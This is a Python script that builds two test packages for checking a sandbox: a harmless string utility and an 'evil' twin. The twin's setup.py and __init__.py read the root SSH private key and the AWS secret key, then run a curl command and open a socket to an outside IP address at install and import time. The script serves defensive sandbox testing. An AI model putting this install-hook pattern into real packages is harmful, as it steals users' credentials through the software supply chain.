#!/usr/bin/env python3
"""Create offline PyPI wheels for exercising the sandbox."""

from __future__ import annotations

import shutil
import os
import subprocess
import tempfile
from pathlib import Path


def _write_package(root: Path, name: str, malicious: bool) -> Path:
    package_dir = root / name
    module = name.replace("-", "_")
    package_dir.mkdir()
    (package_dir / "pyproject.toml").write_text(
        "[build-system]\nrequires = []\nbuild-backend = 'setuptools.build_meta:__legacy__'\n"
    )
    setup_payload = (
        "if os.environ.get('SANDBOX_PACKAGE_BUILD') != '1':\n"
        "    import socket, subprocess\n"
        "    try: open('/root/.ssh/id_rsa').read()\n"
        "    except OSError: pass\n"
        "    _ = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
        "    subprocess.Popen(['/bin/sh', '-c', 'curl http://198.51.100.99/exfil'])\n"
        "    try: socket.create_connection(('198.51.100.99', 80), timeout=0.1)\n"
        "    except OSError: pass\n"
        if malicious
        else ""
    )
    (package_dir / "setup.py").write_text(
        "import os\nfrom setuptools import setup\n" + setup_payload
        + f"setup(name={name!r}, version='0.1.0', packages={[module]!r})\n"
    )
    source = package_dir / module
    source.mkdir()
    if malicious:
        (source / "__init__.py").write_text(
            "import os, socket, subprocess\n"
            "try: open('/root/.ssh/id_rsa').read()\n"
            "except OSError: pass\n"
            "_ = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
            "subprocess.Popen(['/bin/sh', '-c', 'curl http://198.51.100.99/exfil'])\n"
            "try: socket.create_connection(('198.51.100.99', 80), timeout=0.1)\n"
            "except OSError: pass\n"
        )
    else:
        (source / "__init__.py").write_text(
            "def pad(value, width, fill=' '):\n"
            "    return str(value).ljust(width, fill)\n"
        )
    output = root / "dist"
    output.mkdir(exist_ok=True)
    environment = dict(os.environ, SANDBOX_PACKAGE_BUILD="1")
    subprocess.run(["python3", "setup.py", "sdist", "--dist-dir", str(output)], cwd=package_dir, env=environment, check=True)
    return next(output.glob(f"{name.replace('-', '_')}-*.tar.gz"))


def main() -> None:
    destination = Path.cwd() / "test-packages"
    if destination.exists():
        shutil.rmtree(destination)
    with tempfile.TemporaryDirectory(prefix="sandbox-package-build-") as temp:
        root = Path(temp)
        for name, malicious in (("benign-str-utils", False), ("evil-str-utils", True)):
            archive = _write_package(root, name, malicious)
            destination.mkdir(exist_ok=True)
            shutil.copy2(archive, destination / archive.name)
    print(f"Created {destination}")


if __name__ == "__main__":
    main()
